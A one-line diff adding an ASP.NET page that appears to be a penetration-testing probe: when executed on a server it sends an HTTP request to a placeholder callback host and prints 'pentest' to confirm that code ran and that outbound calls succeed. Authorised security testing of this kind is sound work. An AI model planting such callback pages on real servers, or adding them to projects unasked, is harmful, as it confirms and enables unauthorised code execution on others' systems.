@@ -1,0 +1,1 @@
+<%@ Page Language="C#" %><%@ Import Namespace="System.Net" %><% try{var r=(HttpWebRequest)WebRequest.Create("https://callback.example.invalid/pentest/aspx-http");r.AllowAutoRedirect=false;r.Timeout=3000;r.ReadWriteTimeout=3000;using(var s=r.GetResponse()){Response.Write("pentest");}}catch(Exception){Response.Write("pentest: callback failed");} %>
